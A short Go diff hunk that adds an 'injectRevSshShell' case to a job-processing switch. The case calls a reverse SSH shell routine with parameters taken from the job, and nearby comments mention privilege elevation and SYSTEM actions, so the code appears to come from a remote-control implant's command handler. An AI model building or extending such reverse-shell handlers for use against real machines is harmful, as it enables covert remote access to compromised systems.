@@ -218,6 +218,14 @@ func jobProcessor(){
 					}
 		   			contChannel <- "continue"
 
+		   		case "injectRevSshShell":
+
+		   			error,result = biterpreter.RevSshShell(job.Parameters)
+		   			if error{
+						result = "Error Injecting Reverse SSH Shell:"+ result
+					}
+		   			contChannel <- "continue"
+
 		   		//Elevate
 
 		   		//SYSTEM Actions
